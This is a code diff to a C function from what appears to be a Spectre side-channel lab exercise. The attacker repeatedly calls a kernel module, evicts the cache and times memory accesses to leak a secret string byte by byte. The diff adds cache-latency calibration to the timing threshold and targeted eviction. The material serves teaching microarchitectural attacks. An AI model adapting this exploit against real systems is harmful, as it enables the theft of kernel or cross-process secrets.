@@ -41,10 +41,9 @@ int run_attacker(int kernel_fd, char *shared_memory)
 {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
-    //CacheStats cache_stats = generate_cache_stats(1000);
+    CacheStats cache_stats = generate_cache_stats(1000);
     //print_cache_stats(cache_stats);
     printf("Launching attacker\n");
-    
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++)
     {
         char leaked_byte;
@@ -53,12 +52,13 @@ int run_attacker(int kernel_fd, char *shared_memory)
         {
             for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) 
             {
-                REPEAT(2) call_kernel_part3(kernel_fd, shared_memory, 1);
                 void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
-                REPEAT(10) evict_all_cache();
+                REPEAT(2) call_kernel_part3(kernel_fd, shared_memory, 0);
+                evict_address(target_addr);
+                REPEAT(3) evict_all_cache();
                 call_kernel_part3(kernel_fd, shared_memory, current_offset);
                 uint64_t time = time_access(target_addr);
-                if (time <=  100 /*Plus some padding*/) {
+                if (time <= cache_stats.l2 + 20 /*Plus some padding*/) {
                     leaked_byte = (char)i;
                     found = true;
                     break;
@@ -73,7 +73,7 @@ int run_attacker(int kernel_fd, char *shared_memory)
     }
 
     printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
-    //destroy_cache_stats(cache_stats);
+    destroy_cache_stats(cache_stats);
 
     close(kernel_fd);
     return EXIT_SUCCESS;
